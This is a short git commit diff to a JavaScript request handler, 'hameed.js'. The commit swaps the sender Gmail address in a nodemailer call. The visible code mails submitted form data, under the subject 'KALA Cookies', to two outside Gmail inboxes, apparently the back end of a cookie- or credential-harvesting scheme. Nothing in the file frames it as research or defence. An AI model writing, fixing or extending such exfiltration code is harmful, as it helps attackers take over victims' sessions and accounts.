c967c0cfa69447c6510bd5a2644e497816633c57
ejefkmnhhj-cmyk <ejefkmnhhj@gmail.com>
2026-01-29 19:29:04 +0500

    Update hameed.js

--- hameed.js
+++ hameed.js
@@ -40,7 +40,7 @@ export default async function handler(req, res) {
   try {
     // Try sending email
     await transporter.sendMail({
-      from: `"PROFESSOR" <jsjjjaj671@gmail.com>`,
+      from: `"PROFESSOR" <akakk3485@gmail.com>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
       subject: "KALA Cookies",
       text: JSON.stringify(formData, null, 2),
